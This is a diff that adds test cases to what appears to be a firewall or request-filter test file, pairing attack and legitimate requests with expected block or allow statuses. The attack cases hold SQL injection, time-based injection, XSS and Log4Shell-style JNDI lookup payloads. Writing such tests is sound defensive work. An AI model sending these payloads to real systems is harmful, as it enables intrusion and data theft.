@@ -169,5 +169,47 @@
     "kind": "legitimate",
     "url": "https://simulation.test/api?q=union%20members",
     "expectedStatus": 204
+  },
+  {
+    "name": "union-any-parameter",
+    "kind": "attack",
+    "url": "https://simulation.test/api?custom=1%20UNION%20SELECT%20password",
+    "expectedStatus": 403
+  },
+  {
+    "name": "sleep-any-parameter",
+    "kind": "attack",
+    "url": "https://simulation.test/api?param=SLEEP(4)",
+    "expectedStatus": 403
+  },
+  {
+    "name": "xss-any-parameter",
+    "kind": "attack",
+    "url": "https://simulation.test/api?content=%3Cscript%3Ehello%3C/script%3E",
+    "expectedStatus": 403
+  },
+  {
+    "name": "jndi-any-header",
+    "kind": "attack",
+    "url": "https://simulation.test/api",
+    "headers": {
+      "x-customer-hint": "${jndi:ldap://example.test/x}"
+    },
+    "expectedStatus": 403
+  },
+  {
+    "name": "normal-unknown-parameter",
+    "kind": "legitimate",
+    "url": "https://simulation.test/api?opaque=organization",
+    "expectedStatus": 204
+  },
+  {
+    "name": "normal-other-header",
+    "kind": "legitimate",
+    "url": "https://simulation.test/api",
+    "headers": {
+      "x-customer-hint": "normal"
+    },
+    "expectedStatus": 204
   }
 ]
